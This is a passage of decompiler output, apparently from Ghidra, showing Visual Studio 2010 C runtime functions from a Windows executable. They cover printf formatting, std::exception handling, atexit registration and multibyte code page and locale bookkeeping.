              if ((-1 < local_420) && (pbVar10 = local_46c, (local_40c & 4) != 0)) {
                do {
                  if ((int)pbVar10 < 1) break;
                  _write_char(L' ');
                  pbVar10 = pbVar10 + -1;
                } while (local_420 != -1);
              }
            }
          }
          else {
            if (0x70 < local_424) {
              if (local_424 == 0x73) {
LAB_0040fa13:
                piVar3 = (int *)0x7fffffff;
                if (local_410 != (int *)0xffffffff) {
                  piVar3 = local_410;
                }
                local_41c = (int **)((int)_ArgList + 4);
                local_414 = *(int **)_ArgList;
                if ((local_40c & 0x20) == 0) {
                  piVar9 = local_414;
                  if (local_414 == (int *)0x0) {
                    local_414 = (int *)PTR_u__null__00420d28;
                    piVar9 = (int *)PTR_u__null__00420d28;
                  }
                  for (; (piVar3 != (int *)0x0 &&
                         (piVar3 = (int *)((int)piVar3 + -1), *(ushort *)piVar9 != 0));
                      piVar9 = (int *)((int)piVar9 + 2)) {
                  }
                  iVar6 = (int)piVar9 - (int)local_414;
LAB_0040ff72:
                  local_41c = (int **)((int)_ArgList + 4);
                  local_42c = 1;
                  local_418 = (byte *)(iVar6 >> 1);
                }
                else {
                  if (local_414 == (int *)0x0) {
                    local_414 = (int *)PTR_DAT_00420d24;
                  }
                  local_418 = (byte *)0x0;
                  piVar9 = local_414;
                  if (0 < (int)piVar3) {
                    do {
                      if (*(byte *)piVar9 == 0) break;
                      iVar6 = __isleadbyte_l((uint)*(byte *)piVar9,&local_450);
                      if (iVar6 != 0) {
                        piVar9 = (int *)((int)piVar9 + 1);
                      }
                      piVar9 = (int *)((int)piVar9 + 1);
                      local_418 = local_418 + 1;
                    } while ((int)local_418 < (int)piVar3);
                  }
                }
                goto LAB_0040ff7a;
              }
              if (local_424 == 0x75) goto LAB_0040fc3f;
              if (local_424 != 0x78) goto LAB_0040ff7a;
              local_458 = 0x27;
LAB_0040fdcf:
              local_424 = 0x10;
              if ((local_40c & 0x80) != 0) {
                local_43c = L'0';
                local_43a = (short)local_458 + 0x51;
                local_428 = (void *)0x2;
              }
              goto LAB_0040fc49;
            }
            if (local_424 == 0x70) {
              local_410 = (int *)0x8;
LAB_0040fd9f:
              local_458 = 7;
              goto LAB_0040fdcf;
            }
            if (local_424 < 0x65) goto LAB_0040ff7a;
            if (local_424 < 0x68) goto LAB_0040f9aa;
            if (local_424 == 0x69) goto LAB_0040fc38;
            if (local_424 != 0x6e) {
              if (local_424 != 0x6f) goto LAB_0040ff7a;
              local_424 = 8;
              if ((local_40c & 0x80) != 0) {
                local_40c = local_40c | 0x200;
              }
              goto LAB_0040fc49;
            }
            piVar3 = *(int **)_ArgList;
            local_41c = (int **)((int)_ArgList + 4);
            iVar6 = __get_printf_count_output();
            if (iVar6 == 0) goto switchD_0040f73c_caseD_9;
            if ((local_40c & 0x20) == 0) {
              *piVar3 = local_420;
            }
            else {
              *(ushort *)piVar3 = (ushort)local_420;
            }
            local_454 = 1;
          }
          pwVar8 = local_460;
          ppiVar11 = local_41c;
          if (local_45c != (int *)0x0) {
            _free(local_45c);
            local_45c = (int *)0x0;
            pwVar8 = local_460;
            ppiVar11 = local_41c;
          }
          break;
        default:
          goto switchD_0040f73c_caseD_9;
        case 0xbad1abe1:
          break;
        }
        local_424 = (uint)(ushort)*pwVar8;
        _Format = pwVar8;
        _ArgList = (va_list)ppiVar11;
      } while (*pwVar8 != L'\0');
      if ((local_440 != 0) && (local_440 != 7)) goto switchD_0040f73c_caseD_9;
    }
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &,int)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::exception(exception *this,char **param_1,int param_2)

{
  *(undefined ***)this = &PTR_FUN_0041ad1c;
  *(char **)(this + 4) = *param_1;
  this[8] = (exception)0x0;
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Copy_str(char const *)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Copy_str(exception *this,char *param_1)

{
  size_t sVar1;
  char *_Dst;
  
  if (param_1 != (char *)0x0) {
    sVar1 = _strlen(param_1);
    _Dst = (char *)_malloc(sVar1 + 1);
    *(char **)(this + 4) = _Dst;
    if (_Dst != (char *)0x0) {
      _strcpy_s(_Dst,sVar1 + 1,param_1);
      this[8] = (exception)0x1;
    }
  }
  return;
}



// Library Function - Single Match
//  private: void __thiscall std::exception::_Tidy(void)
// 
// Library: Visual Studio 2010 Release

void __thiscall std::exception::_Tidy(exception *this)

{
  if (this[8] != (exception)0x0) {
    _free(*(void **)(this + 4));
  }
  *(undefined4 *)(this + 4) = 0;
  this[8] = (exception)0x0;
  return;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(char const * const &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::exception(exception *this,char **param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = &PTR_FUN_0041ad1c;
  this[8] = (exception)0x0;
  _Copy_str(this,*param_1);
  return this;
}



// Library Function - Single Match
//  public: class std::exception & __thiscall std::exception::operator=(class std::exception const
// &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::operator=(exception *this,exception *param_1)

{
  if (this != param_1) {
    _Tidy(this);
    if (param_1[8] == (exception)0x0) {
      *(undefined4 *)(this + 4) = *(undefined4 *)(param_1 + 4);
    }
    else {
      _Copy_str(this,*(char **)(param_1 + 4));
    }
  }
  return this;
}



void __fastcall FUN_004102b1(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0041ad1c;
  std::exception::_Tidy((exception *)param_1);
  return;
}



undefined4 * __thiscall FUN_004102bc(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0041ad1c;
  std::exception::_Tidy((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a83e(this);
  }
  return (undefined4 *)this;
}



// Library Function - Single Match
//  public: __thiscall std::exception::exception(class std::exception const &)
// 
// Library: Visual Studio 2010 Release

exception * __thiscall std::exception::exception(exception *this,exception *param_1)

{
  *(undefined4 *)(this + 4) = 0;
  *(undefined ***)this = &PTR_FUN_0041ad1c;
  this[8] = (exception)0x0;
  operator=(this,param_1);
  return this;
}



// Library Function - Single Match
//  public: virtual __thiscall type_info::~type_info(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall type_info::~type_info(type_info *this)

{
  *(undefined ***)this = &PTR__scalar_deleting_destructor__0041ad3c;
  _Type_info_dtor(this);
  return;
}



// Library Function - Single Match
//  public: virtual void * __thiscall type_info::`scalar deleting destructor'(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __thiscall type_info::_scalar_deleting_destructor_(type_info *this,uint param_1)

{
  ~type_info(this);
  if ((param_1 & 1) != 0) {
    FUN_0040a83e(this);
  }
  return this;
}



// Library Function - Single Match
//  public: bool __thiscall type_info::operator==(class type_info const &)const 
// 
// Library: Visual Studio 2010 Release

bool __thiscall type_info::operator==(type_info *this,type_info *param_1)

{
  int iVar1;
  
  iVar1 = _strcmp((char *)(param_1 + 9),(char *)(this + 9));
  return (bool)('\x01' - (iVar1 != 0));
}



// Library Function - Single Match
//  __onexit_nolock
// 
// Library: Visual Studio 2010 Release

PVOID __cdecl __onexit_nolock(PVOID param_1)

{
  PVOID *_Memory;
  PVOID *ppvVar1;
  size_t sVar2;
  size_t sVar3;
  PVOID pvVar4;
  int iVar5;
  
  _Memory = (PVOID *)DecodePointer(DAT_0042496c);
  ppvVar1 = (PVOID *)DecodePointer(DAT_00424968);
  if ((ppvVar1 < _Memory) || (iVar5 = (int)ppvVar1 - (int)_Memory, iVar5 + 4U < 4)) {
    return (PVOID)0x0;
  }
  sVar2 = __msize(_Memory);
  if (sVar2 < iVar5 + 4U) {
    sVar3 = 0x800;
    if (sVar2 < 0x800) {
      sVar3 = sVar2;
    }
    if ((sVar3 + sVar2 < sVar2) ||
       (pvVar4 = __realloc_crt(_Memory,sVar3 + sVar2), pvVar4 == (void *)0x0)) {
      if (sVar2 + 0x10 < sVar2) {
        return (PVOID)0x0;
      }
      pvVar4 = __realloc_crt(_Memory,sVar2 + 0x10);
      if (pvVar4 == (void *)0x0) {
        return (PVOID)0x0;
      }
    }
    ppvVar1 = (PVOID *)((int)pvVar4 + (iVar5 >> 2) * 4);
    DAT_0042496c = EncodePointer(pvVar4);
  }
  pvVar4 = EncodePointer(param_1);
  *ppvVar1 = pvVar4;
  DAT_00424968 = EncodePointer(ppvVar1 + 1);
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __onexit
// 
// Library: Visual Studio 2010 Release

_onexit_t __cdecl __onexit(_onexit_t _Func)

{
  _onexit_t p_Var1;
  
  FUN_0040cbb6();
  p_Var1 = (_onexit_t)__onexit_nolock(_Func);
  FUN_00410476();
  return p_Var1;
}



void FUN_00410476(void)

{
  FUN_0040cbbf();
  return;
}



// Library Function - Single Match
//  _atexit
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _atexit(_func_4879 *param_1)

{
  _onexit_t p_Var1;
  
  p_Var1 = __onexit((_onexit_t)param_1);
  return (p_Var1 != (_onexit_t)0x0) - 1;
}



// Library Function - Single Match
//  __CxxThrowException@8
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __CxxThrowException_8(undefined4 param_1,byte *param_2)

{
  int iVar1;
  DWORD *pDVar2;
  DWORD *pDVar3;
  DWORD local_24 [4];
  DWORD local_14;
  ULONG_PTR local_10;
  undefined4 local_c;
  byte *local_8;
  
  pDVar2 = &DAT_0041ad40;
  pDVar3 = local_24;
  for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {
    *pDVar3 = *pDVar2;
    pDVar2 = pDVar2 + 1;
    pDVar3 = pDVar3 + 1;
  }
  local_c = param_1;
  local_8 = param_2;
  if ((param_2 != (byte *)0x0) && ((*param_2 & 8) != 0)) {
    local_10 = 0x1994000;
  }
  RaiseException(local_24[0],local_24[1],local_14,&local_10);
  return;
}



// Library Function - Single Match
//  int __cdecl CPtoLCID(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl CPtoLCID(int param_1)

{
  int in_EAX;
  
  if (in_EAX == 0x3a4) {
    return 0x411;
  }
  if (in_EAX == 0x3a8) {
    return 0x804;
  }
  if (in_EAX == 0x3b5) {
    return 0x412;
  }
  if (in_EAX != 0x3b6) {
    return 0;
  }
  return 0x404;
}



// Library Function - Single Match
//  void __cdecl setSBCS(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBCS(threadmbcinfostruct *param_1)

{
  int in_EAX;
  undefined *puVar1;
  int iVar2;
  
  _memset((void *)(in_EAX + 0x1c),0,0x101);
  *(undefined4 *)(in_EAX + 4) = 0;
  *(undefined4 *)(in_EAX + 8) = 0;
  *(undefined4 *)(in_EAX + 0xc) = 0;
  *(undefined4 *)(in_EAX + 0x10) = 0;
  *(undefined4 *)(in_EAX + 0x14) = 0;
  *(undefined4 *)(in_EAX + 0x18) = 0;
  puVar1 = (undefined *)(in_EAX + 0x1c);
  iVar2 = 0x101;
  do {
    *puVar1 = puVar1[(int)&DAT_004205a8 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  puVar1 = (undefined *)(in_EAX + 0x11d);
  iVar2 = 0x100;
  do {
    *puVar1 = puVar1[(int)&DAT_004205a8 - in_EAX];
    puVar1 = puVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



// Library Function - Single Match
//  void __cdecl setSBUpLow(struct threadmbcinfostruct *)
// 
// Library: Visual Studio 2010 Release

void __cdecl setSBUpLow(threadmbcinfostruct *param_1)

{
  byte *pbVar1;
  char *pcVar2;
  BOOL BVar3;
  uint uVar4;
  CHAR CVar5;
  char cVar6;
  BYTE *pBVar7;
  int unaff_ESI;
  _cpinfo local_51c;
  WORD local_508 [256];
  CHAR local_308 [256];
  CHAR local_208 [256];
  CHAR local_108 [256];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  BVar3 = GetCPInfo(*(UINT *)(unaff_ESI + 4),&local_51c);
  if (BVar3 == 0) {
    uVar4 = 0;
    do {
      pcVar2 = (char *)(unaff_ESI + 0x11d + uVar4);
      if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) + 0x20 < (char *)0x1a) {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        cVar6 = (char)uVar4 + ' ';
LAB_004106e8:
        *pcVar2 = cVar6;
      }
      else {
        if (pcVar2 + (-0x61 - (unaff_ESI + 0x11d)) < (char *)0x1a) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          cVar6 = (char)uVar4 + -0x20;
          goto LAB_004106e8;
        }
        *pcVar2 = '\0';
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  else {
    uVar4 = 0;
    do {
      local_108[uVar4] = (CHAR)uVar4;
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
    local_108[0] = ' ';
    if (local_51c.LeadByte[0] != 0) {
      pBVar7 = local_51c.LeadByte + 1;
      do {
        uVar4 = (uint)local_51c.LeadByte[0];
        if (uVar4 <= *pBVar7) {
          _memset(local_108 + uVar4,0x20,(*pBVar7 - uVar4) + 1);
        }
        local_51c.LeadByte[0] = pBVar7[1];
        pBVar7 = pBVar7 + 2;
      } while (local_51c.LeadByte[0] != 0);
    }
    ___crtGetStringTypeA
              ((_locale_t)0x0,1,local_108,0x100,local_508,*(int *)(unaff_ESI + 4),
               *(BOOL *)(unaff_ESI + 0xc));
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x100,local_108,0x100,local_208,
                       0x100,*(int *)(unaff_ESI + 4),0);
    ___crtLCMapStringA((_locale_t)0x0,*(LPCWSTR *)(unaff_ESI + 0xc),0x200,local_108,0x100,local_308,
                       0x100,*(int *)(unaff_ESI + 4),0);
    uVar4 = 0;
    do {
      if ((local_508[uVar4] & 1) == 0) {
        if ((local_508[uVar4] & 2) != 0) {
          pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
          *pbVar1 = *pbVar1 | 0x20;
          CVar5 = local_308[uVar4];
          goto LAB_0041068b;
        }
        *(undefined *)(unaff_ESI + 0x11d + uVar4) = 0;
      }
      else {
        pbVar1 = (byte *)(unaff_ESI + 0x1d + uVar4);
        *pbVar1 = *pbVar1 | 0x10;
        CVar5 = local_208[uVar4];
LAB_0041068b:
        *(CHAR *)(unaff_ESI + 0x11d + uVar4) = CVar5;
      }
      uVar4 = uVar4 + 1;
    } while (uVar4 < 0x100);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___updatetmbcinfo
// 
// Library: Visual Studio 2010 Release

pthreadmbcinfo __cdecl ___updatetmbcinfo(void)

{
  _ptiddata p_Var1;
  LONG LVar2;
  pthreadmbcinfo lpAddend;
  
  p_Var1 = __getptd();
  if (((p_Var1->_ownlocale & DAT_00420ac8) == 0) || (p_Var1->ptlocinfo == (pthreadlocinfo)0x0)) {
    __lock(0xd);
    lpAddend = p_Var1->ptmbcinfo;
    if (lpAddend != (pthreadmbcinfo)PTR_DAT_004209d0) {
      if (lpAddend != (pthreadmbcinfo)0x0) {
        LVar2 = InterlockedDecrement(&lpAddend->refcount);
        if ((LVar2 == 0) && (lpAddend != (pthreadmbcinfo)&DAT_004205a8)) {
          _free(lpAddend);
        }
      }
      p_Var1->ptmbcinfo = (pthreadmbcinfo)PTR_DAT_004209d0;
      lpAddend = (pthreadmbcinfo)PTR_DAT_004209d0;
      InterlockedIncrement((LONG *)PTR_DAT_004209d0);
    }
    FUN_0041079d();
  }
  else {
    lpAddend = p_Var1->ptmbcinfo;
  }
  if (lpAddend == (pthreadmbcinfo)0x0) {
    __amsg_exit(0x20);
  }
  return lpAddend;
}



void FUN_0041079d(void)

{
  FUN_004127a9(0xd);
  return;
}



// Library Function - Single Match
//  int __cdecl getSystemCP(int)
// 
// Library: Visual Studio 2010 Release

int __cdecl getSystemCP(int param_1)

{
  UINT UVar1;
  int unaff_ESI;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,(localeinfo_struct *)0x0);
  DAT_00422228 = 0;
  if (unaff_ESI == -2) {
    DAT_00422228 = 1;
    UVar1 = GetOEMCP();
  }
  else if (unaff_ESI == -3) {
    DAT_00422228 = 1;
    UVar1 = GetACP();
  }
  else {
    if (unaff_ESI != -4) {
      if (local_8 == '\0') {
        DAT_00422228 = 0;
        return unaff_ESI;
      }
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      return unaff_ESI;
    }
    UVar1 = *(UINT *)(local_14[0] + 4);
    DAT_00422228 = 1;
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return UVar1;
}



// Library Function - Single Match
//  __setmbcp_nolock
// 
// Library: Visual Studio 2010 Release

void __cdecl __setmbcp_nolock(undefined4 param_1,int param_2)

{
  BYTE *pBVar1;
  byte *pbVar2;
  byte bVar3;
  uint uVar4;
  uint uVar5;
  BOOL BVar6;
  undefined2 *puVar7;
  byte *pbVar8;
  int extraout_ECX;
  undefined2 *puVar9;
  int iVar10;
  undefined4 extraout_EDX;
  BYTE *pBVar11;
  threadmbcinfostruct *unaff_EDI;
  uint local_24;
  byte *local_20;
  _cpinfo local_1c;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  uVar4 = getSystemCP((int)unaff_EDI);
  if (uVar4 != 0) {
    local_20 = (byte *)0x0;
    uVar5 = 0;
LAB_00410860:
    if (*(uint *)((int)&DAT_004209d8 + uVar5) != uVar4) goto code_r0x0041086c;
    _memset((void *)(param_2 + 0x1c),0,0x101);
    local_24 = 0;
    pbVar8 = &DAT_004209e8 + (int)local_20 * 0x30;
    local_20 = pbVar8;
    do {
      for (; (*pbVar8 != 0 && (bVar3 = pbVar8[1], bVar3 != 0)); pbVar8 = pbVar8 + 2) {
        for (uVar5 = (uint)*pbVar8; uVar5 <= bVar3; uVar5 = uVar5 + 1) {
          pbVar2 = (byte *)(param_2 + 0x1d + uVar5);
          *pbVar2 = *pbVar2 | (&DAT_004209d4)[local_24];
          bVar3 = pbVar8[1];
        }
      }
      local_24 = local_24 + 1;
      pbVar8 = local_20 + 8;
      local_20 = pbVar8;
    } while (local_24 < 4);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 8) = 1;
    iVar10 = CPtoLCID((int)unaff_EDI);
    *(int *)(param_2 + 0xc) = iVar10;
    puVar7 = (undefined2 *)(param_2 + 0x10);
    puVar9 = (undefined2 *)(&DAT_004209dc + extraout_ECX);
    iVar10 = 6;
    do {
      *puVar7 = *puVar9;
      puVar9 = puVar9 + 1;
      puVar7 = puVar7 + 1;
      iVar10 = iVar10 + -1;
    } while (iVar10 != 0);
    goto LAB_00410994;
  }
LAB_0041084d:
  setSBCS(unaff_EDI);
LAB_004109fc:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
code_r0x0041086c:
  local_20 = (byte *)((int)local_20 + 1);
  uVar5 = uVar5 + 0x30;
  if (0xef < uVar5) goto code_r0x00410879;
  goto LAB_00410860;
code_r0x00410879:
  if (((uVar4 == 65000) || (uVar4 == 0xfde9)) ||
     (BVar6 = IsValidCodePage(uVar4 & 0xffff), BVar6 == 0)) goto LAB_004109fc;
  BVar6 = GetCPInfo(uVar4,&local_1c);
  if (BVar6 != 0) {
    _memset((void *)(param_2 + 0x1c),0,0x101);
    *(uint *)(param_2 + 4) = uVar4;
    *(undefined4 *)(param_2 + 0xc) = 0;
    if (local_1c.MaxCharSize < 2) {
      *(undefined4 *)(param_2 + 8) = 0;
    }
    else {
      if (local_1c.LeadByte[0] != '\0') {
        pBVar11 = local_1c.LeadByte + 1;
        do {
          bVar3 = *pBVar11;
          if (bVar3 == 0) break;
          for (uVar4 = (uint)pBVar11[-1]; uVar4 <= bVar3; uVar4 = uVar4 + 1) {
            pbVar8 = (byte *)(param_2 + 0x1d + uVar4);
            *pbVar8 = *pbVar8 | 4;
          }
          pBVar1 = pBVar11 + 1;
          pBVar11 = pBVar11 + 2;
        } while (*pBVar1 != 0);
      }
      pbVar8 = (byte *)(param_2 + 0x1e);
      iVar10 = 0xfe;
      do {
        *pbVar8 = *pbVar8 | 8;
        pbVar8 = pbVar8 + 1;
        iVar10 = iVar10 + -1;
      } while (iVar10 != 0);
      iVar10 = CPtoLCID((int)unaff_EDI);
      *(int *)(param_2 + 0xc) = iVar10;
      *(undefined4 *)(param_2 + 8) = extraout_EDX;
    }
    *(undefined4 *)(param_2 + 0x10) = 0;
    *(undefined4 *)(param_2 + 0x14) = 0;
    *(undefined4 *)(param_2 + 0x18) = 0;
LAB_00410994:
    setSBUpLow(unaff_EDI);
    goto LAB_004109fc;
  }
  if (DAT_00422228 == 0) goto LAB_004109fc;
  goto LAB_0041084d;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int FUN_00410a0b(undefined4 param_1)

{
  _ptiddata p_Var1;
  int iVar2;
  pthreadmbcinfo ptVar3;
  LONG LVar4;
  int *piVar5;
  int iVar6;
  pthreadmbcinfo ptVar7;
  pthreadmbcinfo ptVar8;
  int in_stack_ffffffc8;
  int local_24;
  
  local_24 = -1;
  p_Var1 = __getptd();
  ___updatetmbcinfo();
  ptVar3 = p_Var1->ptmbcinfo;
  iVar2 = getSystemCP(in_stack_ffffffc8);
  if (iVar2 == ptVar3->mbcodepage) {
    local_24 = 0;
  }
  else {
    ptVar3 = (pthreadmbcinfo)__malloc_crt(0x220);
    if (ptVar3 != (pthreadmbcinfo)0x0) {
      ptVar7 = p_Var1->ptmbcinfo;
      ptVar8 = ptVar3;
      for (iVar6 = 0x88; iVar6 != 0; iVar6 = iVar6 + -1) {
        ptVar8->refcount = ptVar7->refcount;
        ptVar7 = (pthreadmbcinfo)&ptVar7->mbcodepage;
        ptVar8 = (pthreadmbcinfo)&ptVar8->mbcodepage;
      }
      ptVar3->refcount = 0;
      local_24 = __setmbcp_nolock(iVar2,(int)ptVar3);
      if (local_24 == 0) {
        LVar4 = InterlockedDecrement(&p_Var1->ptmbcinfo->refcount);
        if ((LVar4 == 0) && (p_Var1->ptmbcinfo != (pthreadmbcinfo)&DAT_004205a8)) {
          _free(p_Var1->ptmbcinfo);
        }
        p_Var1->ptmbcinfo = ptVar3;
        InterlockedIncrement((LONG *)ptVar3);
        if (((*(byte *)&p_Var1->_ownlocale & 2) == 0) && (((byte)DAT_00420ac8 & 1) == 0)) {
          __lock(0xd);
          _DAT_00422238 = ptVar3->mbcodepage;
          _DAT_0042223c = ptVar3->ismbcodepage;
          _DAT_00422240 = *(undefined4 *)ptVar3->mbulinfo;
          for (iVar2 = 0; iVar2 < 5; iVar2 = iVar2 + 1) {
            (&DAT_0042222c)[iVar2] = ptVar3->mbulinfo[iVar2 + 2];
          }
          for (iVar2 = 0; iVar2 < 0x101; iVar2 = iVar2 + 1) {
            (&DAT_004207c8)[iVar2] = ptVar3->mbctype[iVar2 + 4];
          }
          for (iVar2 = 0; iVar2 < 0x100; iVar2 = iVar2 + 1) {
            (&DAT_004208d0)[iVar2] = ptVar3->mbcasemap[iVar2 + 4];
          }
          LVar4 = InterlockedDecrement((LONG *)PTR_DAT_004209d0);
          if ((LVar4 == 0) && (PTR_DAT_004209d0 != &DAT_004205a8)) {
            _free(PTR_DAT_004209d0);
          }
          PTR_DAT_004209d0 = (undefined *)ptVar3;
          InterlockedIncrement((LONG *)ptVar3);
          FUN_00410b6c();
        }
      }
      else if (local_24 == -1) {
        if (ptVar3 != (pthreadmbcinfo)&DAT_004205a8) {
          _free(ptVar3);
        }
        piVar5 = __errno();
        *piVar5 = 0x16;
      }
    }
  }
  return local_24;
}



void FUN_00410b6c(void)

{
  FUN_004127a9(0xd);
  return;
}



// Library Function - Single Match
//  ___addlocaleref
// 
// Library: Visual Studio 2010 Release

void __cdecl ___addlocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  InterlockedIncrement(param_1);
  if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2c]);
  }
  if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2e]);
  }
  if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x2d]);
  }
  if ((LONG *)param_1[0x30] != (LONG *)0x0) {
    InterlockedIncrement((LONG *)param_1[0x30]);
  }
  ppLVar2 = (LONG **)(param_1 + 0x14);
  param_1 = (LONG *)0x6;
  do {
    if ((ppLVar2[-2] != (LONG *)&DAT_00420acc) && (*ppLVar2 != (LONG *)0x0)) {
      InterlockedIncrement(*ppLVar2);
    }
    if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
      InterlockedIncrement(ppLVar2[1]);
    }
    ppLVar2 = ppLVar2 + 4;
    param_1 = (LONG *)((int)param_1 + -1);
  } while (param_1 != (LONG *)0x0);
  InterlockedIncrement((LONG *)(pLVar1[0x35] + 0xb4));
  return;
}



// Library Function - Single Match
//  ___removelocaleref
// 
// Library: Visual Studio 2010 Release

LONG * __cdecl ___removelocaleref(LONG *param_1)

{
  LONG *pLVar1;
  LONG **ppLVar2;
  
  pLVar1 = param_1;
  if (param_1 != (LONG *)0x0) {
    InterlockedDecrement(param_1);
    if ((LONG *)param_1[0x2c] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2c]);
    }
    if ((LONG *)param_1[0x2e] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2e]);
    }
    if ((LONG *)param_1[0x2d] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x2d]);
    }
    if ((LONG *)param_1[0x30] != (LONG *)0x0) {
      InterlockedDecrement((LONG *)param_1[0x30]);
    }
    ppLVar2 = (LONG **)(param_1 + 0x14);
    param_1 = (LONG *)0x6;
    do {
      if ((ppLVar2[-2] != (LONG *)&DAT_00420acc) && (*ppLVar2 != (LONG *)0x0)) {
        InterlockedDecrement(*ppLVar2);
      }
      if ((ppLVar2[-1] != (LONG *)0x0) && (ppLVar2[1] != (LONG *)0x0)) {
        InterlockedDecrement(ppLVar2[1]);
      }
      ppLVar2 = ppLVar2 + 4;
      param_1 = (LONG *)((int)param_1 + -1);
    } while (param_1 != (LONG *)0x0);
    InterlockedDecrement((LONG *)(pLVar1[0x35] + 0xb4));
  }
  return pLVar1;
}



// Library Function - Single Match
//  ___freetlocinfo
// 
// Library: Visual Studio 2010 Release

void __cdecl ___freetlocinfo(void *param_1)

{
  int *piVar1;
  undefined **ppuVar2;
  void *_Memory;
  int **ppiVar3;
  
  _Memory = param_1;
  if ((((*(undefined ***)((int)param_1 + 0xbc) != (undefined **)0x0) &&
       (*(undefined ***)((int)param_1 + 0xbc) != &PTR_DAT_00420e98)) &&
      (*(int **)((int)param_1 + 0xb0) != (int *)0x0)) && (**(int **)((int)param_1 + 0xb0) == 0)) {
    piVar1 = *(int **)((int)param_1 + 0xb8);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_mon(*(int *)((int)param_1 + 0xbc));
    }
    piVar1 = *(int **)((int)param_1 + 0xb4);
    if ((piVar1 != (int *)0x0) && (*piVar1 == 0)) {
      _free(piVar1);
      ___free_lconv_num(*(void ***)((int)param_1 + 0xbc));
    }
    _free(*(void **)((int)param_1 + 0xb0));
    _free(*(void **)((int)param_1 + 0xbc));
  }
  if ((*(int **)((int)param_1 + 0xc0) != (int *)0x0) && (**(int **)((int)param_1 + 0xc0) == 0)) {
    _free((void *)(*(int *)((int)param_1 + 0xc4) + -0xfe));
    _free((void *)(*(int *)((int)param_1 + 0xcc) + -0x80));
    _free((void *)(*(int *)((int)param_1 + 0xd0) + -0x80));
    _free(*(void **)((int)param_1 + 0xc0));
  }
  ppuVar2 = *(undefined ***)((int)param_1 + 0xd4);
  if ((ppuVar2 != &PTR_DAT_00420ad0) && (ppuVar2[0x2d] == (undefined *)0x0)) {
    ___free_lc_time(ppuVar2);
    _free(*(void **)((int)param_1 + 0xd4));
  }
  ppiVar3 = (int **)((int)param_1 + 0x50);
  param_1 = (void *)0x6;
  do {
    if (((ppiVar3[-2] != (int *)&DAT_00420acc) && (piVar1 = *ppiVar3, piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    if (((ppiVar3[-1] != (int *)0x0) && (piVar1 = ppiVar3[1], piVar1 != (int *)0x0)) &&
       (*piVar1 == 0)) {
      _free(piVar1);
    }
    ppiVar3 = ppiVar3 + 4;
